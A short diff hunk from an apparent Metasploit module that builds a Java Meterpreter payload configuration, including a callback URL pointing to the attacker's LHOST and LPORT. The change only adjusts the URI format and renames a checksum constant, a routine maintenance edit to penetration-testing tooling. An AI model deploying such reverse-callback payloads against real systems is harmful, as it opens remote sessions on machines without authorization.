@@ -53,8 +53,8 @@ module Metasploit3
     c << "Spawn=#{spawn}\n"
     c << "URL=http://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "#{luri}/"
-    c << generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ, uri_req_len)
+    c << "#{luri}"
+    c << generate_uri_checksum(:init_java, uri_req_len)
     c << "\n"
 
     c
